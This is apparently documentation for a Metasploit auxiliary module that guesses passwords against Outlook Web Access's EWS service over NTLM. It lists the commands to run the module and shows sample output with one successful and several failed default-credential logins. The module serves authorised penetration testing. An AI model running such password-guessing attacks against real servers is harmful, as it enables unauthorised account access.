This module is for password guessing against OWA's EWS service which often exposes NTLM authentication over HTTPS.
It is typically faster than the traditional form-based OWA login method.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/owa_ews_login```
2. Do: ```set RHOSTS [IP]```
3. Set TARGETURI if necessary.
4. Do: ```run```

## Scenarios

```
msf auxiliary(owa_ews_login) > run

[+] Found NTLM service at /ews/ for domain OWAMSF.
[+] OWA_EWS - Successful login: Administrator:monkey
[-] OWA_EWS - Failed login: root:
[-] OWA_EWS - Failed login: admin:
[-] OWA_EWS - Failed login: guest:
[-] OWA_EWS - Failed login: root:root
[-] OWA_EWS - Failed login: root:password
[-] OWA_EWS - Failed login: root:1234
```
